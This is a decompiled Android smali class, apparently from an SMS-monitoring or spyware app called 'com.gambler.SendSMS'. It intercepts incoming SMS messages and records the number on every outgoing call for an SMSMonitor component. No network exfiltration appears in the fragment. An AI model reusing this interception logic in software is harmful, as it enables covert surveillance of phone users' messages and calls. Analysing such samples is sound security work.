.class final Lcom/gambler/SendSMS/a;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field private synthetic a:Lcom/gambler/SendSMS/SMSMonitor;


# direct methods
.method constructor <init>(Lcom/gambler/SendSMS/SMSMonitor;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/a;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    if-eqz v1, :cond_0

    const-string v0, "pdus"

    invoke-virtual {v1, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, [Ljava/lang/Object;

    array-length v0, p0

    new-array v1, v0, [Landroid/telephony/gsm/SmsMessage;

    const/4 v0, 0x0

    move v2, v0

    :goto_0
    array-length v0, p0

    if-lt v2, v0, :cond_1

    :cond_0
    :goto_1
    return-void

    :cond_1
    aget-object v0, p0, v2

    check-cast v0, [B

    invoke-static {v0}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v0

    aput-object v0, v1, v2

    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_0

    :cond_2
    const-string v2, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/gambler/SendSMS/a;->a:Lcom/gambler/SendSMS/SMSMonitor;

    const-string v2, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "mOutGoingNum == "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/gambler/SendSMS/a;->a:Lcom/gambler/SendSMS/SMSMonitor;

    invoke-static {v1}, Lcom/gambler/SendSMS/SMSMonitor;->a(Lcom/gambler/SendSMS/SMSMonitor;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    goto :goto_1
.end method
